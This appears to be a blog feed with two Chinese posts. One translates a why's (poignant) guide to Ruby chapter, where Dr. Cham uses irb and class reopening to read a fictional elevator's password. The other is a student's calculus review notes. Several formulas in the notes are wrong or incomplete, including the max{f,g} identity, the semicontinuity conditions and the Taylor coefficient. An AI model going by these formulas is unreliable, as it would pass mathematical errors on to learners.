&lt;p&gt;“这个城堡可不是个令人省心的地方. “ Dr. Cham说到.&lt;/p&gt;

&lt;p&gt;一开始, 他还以为自己进入了一个十分昏暗的走廊之中. 
当时当他的眼睛逐渐地适应了周遭的环境之后, 
他惊奇地发现自己所在的这个入口竟然连接着一条隧道. 
这个城堡的大门直直的对着这条用长长的扁石板造就的隧道. 
这条隧道的一部分形成了走廊一样的结构, 另外一些部分变得狭窄, 
突出, 最后形成了高高的尖顶.&lt;/p&gt;

&lt;p&gt;许多小得几乎只能够装下一抱(armful)的卷心菜的冰箱散落在地上, 
不知道为什么, 他们的门都不见了, 里面的溢出的灯光点亮了走廊. 
Dr. Cham好奇的瞥向一个冰箱之中, 里面的光均匀地洒在其中, 
落在冰块上面.&lt;/p&gt;

&lt;p&gt;他伸手抓了一把冰块, 感受着冰块黏在他手掌上的感觉, 
然后双手合拢不停地搓揉着, 融化的冰水淌下了他的手中. 
终于, 他用这冰水享受到了一次小小的沐浴 – 
距离上一次的沐浴是隔了多久了? 十年? 还是三十年?&lt;/p&gt;

&lt;p&gt;沿着道路, 四下七零八落地躺着一卷卷的布料, 穿过了这些, 
不一会儿, 一个由明亮的像素风的瓷器制成的洞穴出现在了他的眼前.&lt;/p&gt;

&lt;p&gt;他发现了一个在洞穴中的隐秘的房间. 房间里排满了巨大的空龟壳, 
甚至墙上也点缀着不少龟壳. 他迷惑地看着这个房间, 
这里曾经是什么? 他有点想要做到龟壳上, 就像是做到凳子上一样, 
休息一下; 但是突然又转念一想, 万一会有什么蜘蛛从龟壳中出来, 
于是放弃了休息的想法, 继续前进了.&lt;/p&gt;

&lt;h3 id=&quot;meal-in-a-castles-pocket&quot;&gt;Meal in a Castle’s Pocket&lt;/h3&gt;
&lt;p&gt;他一路沿着隧道前行, 脚下的主路分成了几条支路, 
又最终在一个巨大的空空荡荡的山洞中汇合了. 
他发现了这个地方的环境有一些共同的主题: 
有几个房间被一个像是泵一样的机器聚在一起, 
而在另外的一个地区, 眼前全是遍地的布料和一缸一缸的胶水. 
听着声音, 他摸索着来到了一个充满毛绒织品和枕头的洞穴 – 但是,
这是一条死胡同: 弯曲的墙壁上在于视线齐平的高度上
却刻了一个小房间.&lt;/p&gt;

&lt;p&gt;他走进了那堵墙, 然后在那个正方体形状的洞里, 
发现了两只坐在桌子上饱餐的食蚁兽.&lt;/p&gt;

&lt;p&gt;它们默默地看了一眼Dr. Cham, 却仍然没有停下自己进食的小爪子, 
对着它们面前足足有两倍于自身身材的蚁穴展开了猛烈的进攻: 
敲开蚁穴的大门, 努力地探出自己的身子去舔食…&lt;/p&gt;

&lt;p&gt;当它们终于停下了自己嘴里的工作后, 盯着自己手上的叉子. 
Dr. Cham觉得是时候说些什么了: “你们好啊, 小家伙们. “
(这里原文是Hello, little puppets, 虽然和后面的故事有关, 
但是我觉得翻译成小木偶的话有点怪. )&lt;/p&gt;

&lt;p&gt;“我真希望我的侄女Hannah能够在这里看到你们这些小家伙, “
他看着其中较小的一只食蚁兽(因为它看起来好像有点好说话的样子),
说到, “她一定会觉得你们是一个绝妙的木偶表演. “ 他瞥向了餐厅, 
橱柜上有着一排一排的盘子, 手巾. 一台机器里面蹦出来一只只
小小的兔子, 小兔子手中又捧着一盘盘浇着奶油的鲜艳的面条,&lt;br /&gt;
从机器里探出上半身来… 在房间的后面的半开着一扇门, 透过门缝, 
Dr. Cham只能或隐或现地看见几张椅子和一闪而过的摩托.&lt;/p&gt;

&lt;p&gt;“大概所有的孩子都想要一个这样的梦幻小屋吧”, 他说到. “我之前说了, 
我侄女Hannah也有一个小小的针织玩偶, 假如放在一台纺织机边上的话, 
就好像是在纺织一般 – 哦, 不是, 我只是在做比喻罢了, 洋娃娃不会纺织. “&lt;/p&gt;

&lt;p&gt;其中一只食蚁兽打开了地上的活板门, 然后点亮里面的按钮, 
于是一个小小的投影机从地上升了起来. 另一只食蚁兽静静地坐着, 看着Dr. Cham.&lt;/p&gt;

&lt;p&gt;“但是Hannah老是跑到他的洋娃娃屋里玩耍, 把自己的纺织作品都小心翼翼地包起来. 
她喜欢把这些展示给他妈妈看. 因为我妹妹很会用缝纫来给娃娃做衣服, 
所以Hannah总会很高兴地为她的娃娃换上妈妈做的衣服.&lt;/p&gt;

&lt;p&gt;“然后她喜欢和娃娃说: ‘娃娃, 你看, 你可爱的外表真适合这样漂亮衣服. 
你绝对会被警官长邀请到他的州长大厦的晚会去的. ‘ 哦, 
她还有一个穿着警官衣服扮演警官长角色的娃娃. 只是他长得实在是太瘦小了, 
估计要再多来点结结实实的塑料才能够看起来像是个真正的警官长. “&lt;/p&gt;

&lt;p&gt;那个负责放映机的食蚁兽装上了电影胶卷, 然后将投影机对准了后墙. 
电影机的胶卷慢慢地转了起来, 那只食蚁兽选了一张凳子坐了下来. 
渐渐地, 墙上出现了一个绿色的正方形投影, 一只食蚁兽仍然盯着Dr. Cham.&lt;/p&gt;

&lt;p&gt;“你们的电影竟然是彩色的, “ Dr. Cham 说到, “多么可爱的小生命啊. “&lt;/p&gt;

&lt;p&gt;影片继续播放着: 一个蓝色的正方形. 接着是红色的圆圈. 然后又是一个橙色的方形. 
那只食蚁兽移开了自己的视线, 然后看向了慢慢变成一个粉色三角形的屏幕, 
继续品尝着自己的盘中食.&lt;/p&gt;

&lt;p&gt;一个紫色的星形. 一个红色的方形. 无声的影片静静地播放着, Dr. Cham
可以听见投影仪转动的静静的噪音. 好像是一个缓缓转动的八音盒 – 
它的齿轮在音轨上拨动, 轻轻地弹奏…&lt;/p&gt;

&lt;p&gt;“好啦, 希望你们能享受你们的晚餐, “ Dr. Cham如此说道, 然后他礼貌的点了点头, 
沿着来时的路走了出去.&lt;/p&gt;

&lt;h3 id=&quot;another-dead-end-where-things-began&quot;&gt;Another Dead End Where Things Began&lt;/h3&gt;
&lt;p&gt;于是Dr. Cham发现自己有一次地在城堡的隧道中迷失了方向. 
周围的东西都看起来十分的陌生. 但是他并不慌 – 毕竟是在另外一个星球, 
不管怎样都是一种迷路嘛.&lt;/p&gt;

&lt;p&gt;他打算穿过隧道, 试试看能不能重新回忆起来时的路, 但是在好奇心的驱使下, 
他打算干脆直接开始探索脚下的这块新土地. 于是沿着一条隧道, 渐渐地深入, 
慢慢地走向隧道的深处… 脚下的地面逐渐变得陡峭起来, 
以至于他只好小心翼翼地依靠在隧道的边上, 每一步都迈得十分小心. 
因为这个星球的重力感觉和地球没有什么大区别, 所以他便得以轻松地滑了下去.&lt;/p&gt;

&lt;p&gt;尽管不知道自己身在何方, 他却有一种迷之自信, 大概他已经离开了这个城堡的边界了. 
自从他进入城堡的大门后, 他已经在这个深邃漫长的隧道中漫步了将近一个多小时了, 
渐渐地, 隧道转了个弯. 看着这个拐弯, 他抱着”柳暗花明又一村”的想法, 
认为没准在过了这个弯后, 就会遇到一个新的房间, 没准是个什么可以探出的窗口, 
好让自己可以透过这个窗口可以看到窗外的风景. 突然他的脑中闪过一个念头: 
没准自己不应该沿着这条路走着么深的. 于是最后只好抱着
“啊, 希望没有什么冬眠的怪兽在前面等着我吧”的想法继续前进了.&lt;/p&gt;

&lt;p&gt;然后就看到了一个死胡同. 一个黑漆漆的死胡同.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://poignant.guide/images/dr.cham-4.gif&quot; alt=&quot;at the end of the tunnel: a computer and a book&quot; title=&quot;在隧道的尽头, 是一台神奇机器和一本书&quot; /&gt;&lt;/p&gt;

&lt;p&gt;因为他有很多的时间, 所以他好好地读了读那本书. 
他读到了小狐狸和他们追击偷走自己的小卡车的小豪猪的故事. 
他也读到了小精灵和火腿的故事. 他看到了自己的漫画, 然后看到了有关自己的故事. 
他也甚至学会了ruby语言. 最后他看到了故事的结尾.&lt;/p&gt;

&lt;p&gt;如果我是他的话, 我估计没法忍受这件事. 但是他却可以. 
然后他在心中默默地记下了接下去的故事.&lt;/p&gt;

&lt;p&gt;在神奇机器的显示器上, Dr. Cham看到一个闪烁着的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;irb&lt;/code&gt;提示符. 就像是Dr. Cham一样, 
你没准可以认出&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;irb&lt;/code&gt;的提示符就是我们在
&lt;a href=&quot;https://poignant.guide/book/expansion-pak-1.html&quot;&gt;The Tiger’s Vest&lt;/a&gt;
(注: 我翻译了这个, 竟然还是我第一个翻译的文章诶. )
(这篇文章是这本书的第一个拓展部分, 讲的主要是关于Interactive Ruby的简单介绍)&lt;/p&gt;

&lt;p&gt;就像是刚刚他用自己的双脚来探索城堡的隧道一样, 
他现在开始尝试着用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;irb&lt;/code&gt;的终端(prompt 提示符)来探索这台神奇机器. 
他把之前的书返回了原来的地方. 因为他再也不需要这本书了. 
接下去的故事都不过是他是否要使用ruby的故事了.&lt;/p&gt;

&lt;p&gt;于是他在终端中输入了:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; Object::constants
  =&amp;gt; [&quot;Marshal&quot;, &quot;String&quot;, &quot;Dir&quot;, &quot;LoadError&quot;, &quot;Float&quot;, ... and so on ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这行代码将会列出所有的top-level(顶层)的常量. 并且由于类常常会以常数的形式被列出, 
所以在这个数组中就会被输出, 所以你就可以看到上面的结果. 
并且我们就可以利用这样的方式来随时随地地看到在ruby中载入了什么东西.&lt;/p&gt;

&lt;p&gt;他扫了一眼上面的数组: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Marshal&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dir&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LoadError&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Float&lt;/code&gt;… 这些都是ruby自带的类.&lt;/p&gt;

&lt;p&gt;但是慢慢地往下看, 发现了一些陌生的东西:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;... &quot;Struct&quot;, &quot;Values&quot;, &quot;Time&quot;, &quot;Elevator&quot;, &quot;Range&quot; ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;等等, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;? 这个好像可不是什么在正经ruby里面的东西. 
看起来没准这个就是一个突破口. 他打算试试:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; Elevator::methods
  =&amp;gt; [&quot;method&quot;, &quot;freeze&quot;, &quot;allocate&quot;, ... another long list ... ]
irb&amp;gt; Elevator::class_variables
  =&amp;gt; ['@@diagnostic_report', '@@power_circuit_active', '@@maintenance_password']
irb&amp;gt; Elevator::constants
  =&amp;gt; []
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看起来&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;类有一堆的方法(methods). 
大多数方法看起来就像是和ruby中的其他正常的对象(object)一样. 举个例子, 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;freeze&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;allocate&lt;/code&gt; 方法是所有Ruby中的对象都会有的普通的方法. 
(&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator::freeze&lt;/code&gt;方法会组织&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;类被改变. 而&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator::allocate&lt;/code&gt;方法, 
则会以不调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;方法的方式新建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;类的对象, 也就是说, 
是新建一个没有初始化过的对象. )&lt;/p&gt;

&lt;p&gt;但是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class_variables&lt;/code&gt;的输出确让Dr. Cham感到有点意思, 看起来这个电梯有些智能. 
但是因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;constants&lt;/code&gt;是一个空数组, 所以在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;中没有什么嵌套的类. 
(虽然我觉得一般的想法是这个类里面没有常量, 而类也同时是常量的一种吧? )&lt;/p&gt;

&lt;p&gt;于是他试了试新建一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;的对象:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; e = Elevator::new
ArgumentError: wrong number of arguments (0 for 1), requires a password
        from (irb):2:in `initialize'
        from (irb):2:in `new'
        from (irb):2
        from :0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(嗯, 要一个密码啊… )于是他试了试几个密码:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; e = Elevator::new( &quot;going up&quot; )
AccessDeniedError: bad password
irb&amp;gt; e = Elevator::new( &quot;going_up&quot; )
AccessDeniedError: bad password
irb&amp;gt; e = Elevator::new( &quot;stairs_are_bad&quot; )
AccessDeniedError: bad password
irb&amp;gt; e = Elevator::new( &quot;StairsAreBad&quot; )
AccessDeniedError: bad password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;就是瞎猜. 呃, 等等! &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;maintenance_password&lt;/code&gt;, 在前面的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class_varibles&lt;/code&gt;里面列出过:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; Elevator::maintenance_password
NoMethodError: undefined method `maintenance_password' for Elevator:Class
        from (irb):1
        from :0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;哈? 出错了. 这是因为实例变量只能够在对象里面被调用, 而类变量也只在类里面能调用. 
那么我们该怎么办呢? (虽然我们也不是没有… )&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;irb&amp;gt; class Elevator
irb&amp;gt;   def Elevator.maintenance_password
irb&amp;gt;     @@maintenance_password
irb&amp;gt;   end
irb&amp;gt; end
  =&amp;gt; nil
irb&amp;gt; Elevator::maintenance_password
  =&amp;gt; &quot;stairs_are_history!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;好的, 现在(正如你所见的)他得到了密码.&lt;/p&gt;

&lt;p&gt;(上面那个看起来很神奇的操作就是一个ruby的特性, 因为ruby可以让我们在任何时候, 
都打开一个类进行修改等等. ) Dr. Cham向&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;类中加入了一个新的方法. 
和你以为的重新定义&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;类的想法不同, Ruby会直接把你的改动加入到已有的类中.&lt;/p&gt;

&lt;p&gt;类变量往往会用两个艾特号&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;来放在前面. 但是一个点号&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt;实际上也是可以的, 
因为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator&lt;/code&gt;本身就是一个类, 所以在程序执行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Elevator.mainentenance_password&lt;/code&gt;时, 
Ruby会去确认你是否在调用一个类的方法. 
所以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@@&lt;/code&gt;的前缀可以让我们的类名字变得更加直观.&lt;/p&gt;

&lt;p&gt;(感觉这一段说得有些不太清楚, 但是我也get不到那个点… )&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Class methods are usually called with the double colon. 
But, a period is fine as well. Since Elevator is a class itself, 
Ruby will figure that if you call Elevator.maintenance_password, 
you’re calling a class method. The double colon simply helps 
make class methods obvious to the reader.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;所以就像这样. 类的方法会有一点点的特殊. 通常你不会想要在一个类里面直接存放信息. 
但是&lt;/p&gt;</content><author><name></name></author><category term="ruby" /><category term="why's_(poignant)_guide_to_ruby" /><summary type="html">Them What Make the Rules and Them What Live the Dream</summary></entry><entry><title type="html">Analysics First Semester The End</title><link href="http://0.0.0.0:4000/notes/analysics-final/" rel="alternate" type="text/html" title="Analysics First Semester The End" /><published>2022-01-04T04:14:03+00:00</published><updated>2022-01-04T04:14:03+00:00</updated><id>http://0.0.0.0:4000/notes/analysics-final</id><content type="html" xml:base="http://0.0.0.0:4000/notes/analysics-final/">&lt;h1 id=&quot;微积分期末复习&quot;&gt;微积分期末复习&lt;/h1&gt;
&lt;p&gt;就是一个慌.&lt;/p&gt;

&lt;h2 id=&quot;问题驱动的复习&quot;&gt;问题驱动的复习&lt;/h2&gt;
&lt;p&gt;下半学期主要在学导数和积分. (才怪呢! 实际上是可以导数的条件和可以积分的条件), 
嘛, 要是真的按照教的来复习的话, 我觉得时间可能有些尴尬. 所以我现在就很功利地, 
先针对老师的期末练习里面出现的题目类型来进行一个习的复.&lt;/p&gt;

&lt;h3 id=&quot;可积分-可微分的条件&quot;&gt;可积分, 可微分的条件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;不定积分 - 微分的逆运算
    &lt;ul&gt;
      &lt;li&gt;&lt;em&gt;连续函数&lt;/em&gt;一定有原函数
        &lt;blockquote&gt;
          &lt;p&gt;连续函数:      &lt;br /&gt;
\(\lim_{x \rightarrow x_0} f(x) = f(x_0) \\ \Leftrightarrow \lim_{x \rightarrow x_0^-} f(x) = f(x_0) 左连续 \And \lim_{x \rightarrow x_0^-} f(x) = f(x_0) 右连续 \\ \Leftrightarrow \forall \varepsilon &amp;gt; 0, \exists \delta (x_0, \varepsilon), x \in U(x_0, \delta), f(x) &amp;lt; f(x_0) + \varepsilon 上半连续 \\ \And \forall \varepsilon &amp;gt; 0, \exists \delta (x_0, \varepsilon), x \in U(x_0, \delta), f(x) &amp;lt; f(x_0) - \varepsilon 下半连续\) &lt;br /&gt;
说明$f$在$x_0$点连续.     &lt;br /&gt;
一致连续函数: \(\forall \varepsilon &amp;gt; 0, \exists \delta, \forall |x_1 - x_2| &amp;lt; \delta, |f(x_1) - f(x_2)| &amp;lt; \varepsilon\)&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;em&gt;第二类间断点&lt;/em&gt;的函数 &lt;strong&gt;可能&lt;/strong&gt; 有原函数&lt;/li&gt;
      &lt;li&gt;&lt;em&gt;第一类间断点&lt;/em&gt;的函数 &lt;strong&gt;没有&lt;/strong&gt; 原函数
        &lt;blockquote&gt;
          &lt;p&gt;间断点及其分类:&lt;/p&gt;
          &lt;ul&gt;
            &lt;li&gt;第一类间断点: 左右极限都存在
              &lt;ul&gt;
                &lt;li&gt;可去间断点: 左右极限相等, 不等于该点函数值&lt;/li&gt;
                &lt;li&gt;跳跃间断点: 左右极限不相等&lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
            &lt;li&gt;第二类间断点: 左右极限至少一个不存在
              &lt;ul&gt;
                &lt;li&gt;无穷间断点: 左右极限在$\overline{\mathbb{R}}$中存在, 有一个是无穷大&lt;/li&gt;
                &lt;li&gt;震荡间断点: 想想这个, $\sin(\frac{1}{x})$, 极限至少一个不存在&lt;/li&gt;
              &lt;/ul&gt;
            &lt;/li&gt;
          &lt;/ul&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;定积分
    &lt;ul&gt;
      &lt;li&gt;可积的第一充分必要条件: $f \in R([a, b]) \Leftrightarrow S = s$   &lt;br /&gt;
(其中$S$是达布上和, $s$为达布下和)
        &lt;blockquote&gt;
          &lt;p&gt;达布和: 取任意剖分, 然后累计$\sup$(上和)或$\inf$(下和)&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;可积的第二充分必要条件: $f \in R([a, b]) \Leftrightarrow \forall \varepsilon &amp;gt; 0, \exists \mathbb{T}, S(\mathbb{T}) - s(\mathbb{T}) &amp;lt; \varepsilon$&lt;/li&gt;
      &lt;li&gt;可积的第三充分必要条件: $f \in R([a, b]) \Leftrightarrow \forall \varepsilon &amp;gt; 0, \eta &amp;gt; 0, \exists \mathbb{T}$, 
属于$\mathbb{T}$中的所有小区间对应的增幅$\omega_k \geq \varepsilon$
的总长度
\(\sum_{\omega_k \geq \varepsilon} \Delta x_k &amp;lt; \eta\)&lt;/li&gt;
      &lt;li&gt;Lebesque 定理: $f \in R([a, b]) \Leftrightarrow f$定义域内有界, 
并且不连续点集合是&lt;em&gt;零测集&lt;/em&gt;.
        &lt;blockquote&gt;
          &lt;p&gt;零测集: 就是\(\sum^{\infty}\|I_n\|\leq \varepsilon\)&lt;/p&gt;
        &lt;/blockquote&gt;
      &lt;/li&gt;
      &lt;li&gt;可积函数类
        &lt;ul&gt;
          &lt;li&gt;$f \in C([a, b])$&lt;/li&gt;
          &lt;li&gt;$f$有界并且只有有限个间断点&lt;/li&gt;
          &lt;li&gt;$f$在$[a,b]$上单调&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;微分
    &lt;ul&gt;
      &lt;li&gt;$f(x)$在$x_0$可导 \(\Leftrightarrow f'_{+}(x) = f'_{-}(x)\)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;应用&quot;&gt;应用&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;泰勒展开  &lt;br /&gt;
\(f(x) = \sum_{k=0}^{n} \frac{f^{(n)}(x_0)}{k!}(x-x_0)^k + o((x-x_0)^n)\)
    &lt;ul&gt;
      &lt;li&gt;麦克劳林多项式: 就是$x_0 = 0$的在$0$点附近的展开&lt;/li&gt;
      &lt;li&gt;佩亚诺型余项: $o((x-x_0)^n)$&lt;/li&gt;
      &lt;li&gt;拉格朗日型余项: $o((x-x_0)^n) = \frac{f^{(n+1)}(\xi)}{(n+1)!}(x-x_0)^{n+1}, \xi \in (x, x_0) \mathrm{or} (x_0, x)$  &lt;br /&gt;
在近似计算的时候就用这样的展开方式, 让拉格朗日余项小于误差即可.&lt;/li&gt;
      &lt;li&gt;积分余项: \(o((x-x_0)^n) = \frac{1}{n!} \int_{x_0}^{x} (x-t)^n f^{(n+1)}(t) \mathrm{d} t\)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;牛顿法近似计算: 
\(x_{n} = x_{n-1} - \frac{f(x_{n-1})}{f'(x_{n-1})} \\ \Delta \leq \frac{|f(x_{n-1})|}{\min\{f'(x)\}}\)&lt;/li&gt;
  &lt;li&gt;中值定理
    &lt;ul&gt;
      &lt;li&gt;
\[\exists f'(a) f'(b) &amp;lt; 0 \Rightarrow \exists f(\xi) = 0, \xi \in (a, b)\]
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;介值定理&lt;/li&gt;
  &lt;li&gt;洛必达: 适用于$\frac{\cdot}{\infty}$型, 和$\frac{0}{0}$型.&lt;/li&gt;
  &lt;li&gt;函数的性质
    &lt;ul&gt;
      &lt;li&gt;极值点: 一阶导数为零的点, 并且两侧的导数异号&lt;/li&gt;
      &lt;li&gt;驻点: 一阶导数为零&lt;/li&gt;
      &lt;li&gt;拐点: 二阶导数为零
        &lt;ul&gt;
          &lt;li&gt;下凸函数定义: $f(\lambda x_1 + (1 - \lambda) x_2) $&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;渐进性: 向$x$, $y$轴或者$y = a x + b$渐进&lt;/li&gt;
      &lt;li&gt;最值: 通过单调性来判断, 然后还要考虑边界点和不连续点&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;计算&quot;&gt;计算&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;微分&lt;/li&gt;
  &lt;li&gt;积分
    &lt;ul&gt;
      &lt;li&gt;不定积分
        &lt;ul&gt;
          &lt;li&gt;递推公式&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;定积分&lt;/li&gt;
      &lt;li&gt;变量替换
        &lt;ul&gt;
          &lt;li&gt;有理分式&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;分部积分&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;题目&quot;&gt;题目&lt;/h2&gt;
&lt;h3 id=&quot;连续性&quot;&gt;连续性&lt;/h3&gt;
&lt;blockquote&gt;
\[f(x) \in C, g(x) = \lim_{t \rightarrow x} f(x) \Rightarrow g(x) \in C\]
&lt;/blockquote&gt;

&lt;p&gt;一道利用定义证明的题目, 只需要检验$\lim_{x \rightarrow x_0} g(x) = g(x_0)$即可&lt;/p&gt;

&lt;blockquote&gt;
\[D(x) = \left\{ \begin{array}{ll} 1 &amp;amp; x \in \mathbb{Q} \\ 0 &amp;amp; x \in \mathbb{R} \backslash \mathbb{Q} \end{array} \right., x D(x)只在x = 0连续\]
&lt;/blockquote&gt;

&lt;p&gt;在$x=0$点的连续性利用定义就可以很好证明了, 在$x \neq 0$处, 需要想一种方法, 
只需要构造$\varepsilon = \frac{1}{2}$即可, 这样的话, 
就会产生在有理数点和无理数点取到的函数值的差大于$\varepsilon$. 
(还利用了&lt;em&gt;有理数在实数中稠&lt;/em&gt;)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;($\mathbb{R}$上)连续函数有最大(小)值&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;假如没有的话, 就可以构造子列, 并且这个子列就会一直大下去, 最后和连续函数矛盾.&lt;/p&gt;

&lt;blockquote&gt;
\[f \in C([0, 1]), f(0) = f(1), \exists x \in [0, \frac{1}{2}], s.t. f(x) = f(x + \frac{1}{2})\]
&lt;/blockquote&gt;

&lt;p&gt;类似这样的题目就是要构造一个$g(x) = f(x) - f(x + \frac{1}{2})$的函数, 
然后证明在$[0, \frac{1}{2}]$上有零点. 零点的证明就是用中值定理来试试.&lt;/p&gt;

&lt;p&gt;这里的题目就可以利用: $g(0) + f(\frac{1}{2}) = f(0) - f(\frac{1}{2}) + f(\frac{1}{2}) - f(1) = 0 \Rightarrow \exists x$&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f \in C([0, + \infty))$一致连续, $\forall x \in [0, 1), \lim_{n \rightarrow \infty} f(x + n) = 0 \Rightarrow lim_{x \rightarrow} f(x) = 0$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这道题要注意, 极限不可以直接就和在一起, 
因为每一个的极限所对应的$N$都是不一样的. 这个很要命, 并且还没法历遍, 
因为在$[0, 1)$中的数是不可数的.&lt;/p&gt;

&lt;p&gt;所以就是通过(连续函数的性质)将$[0, 1)$分割为$\delta$长度的小区间, 
在每个小区间中选择一个代表元, 对每个区间的代表元的$N$历遍, 
然后对于同一个区间的数, 它们就和代表元之间的差是可以忽略的, 于是证明完毕.&lt;/p&gt;

&lt;p&gt;其他的一些技巧:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;
\[\max\{f, g\} = \frac{f+g}{2} + \frac{|f+g|}{2}\]
  &lt;/li&gt;
  &lt;li&gt;
\[\min\{f, g\} = \frac{f+g}{2} - \frac{|f-g|}{2}\]
  &lt;/li&gt;
  &lt;li&gt;
\[|\sqrt[3]{y} - \sqrt[3]{x}| \leq |\sqrt[3]{y-x}|\]
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一些注意的点:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;证明在一个区间上连续的时候不要只考虑几个点, 
因为很有可能会有焦点无穷密集的时候, 就会让用定义证明点连续很困难.&lt;/li&gt;
  &lt;li&gt;$\mathbb{R}$上连续周期函数一定一致连续, 证明的时候考虑$[-T, T]$上的一致连续, 
防止出现类似于$x_1 = 0 + \varepsilon_1, x_2 = T - \varepsilon_2$&lt;/li&gt;
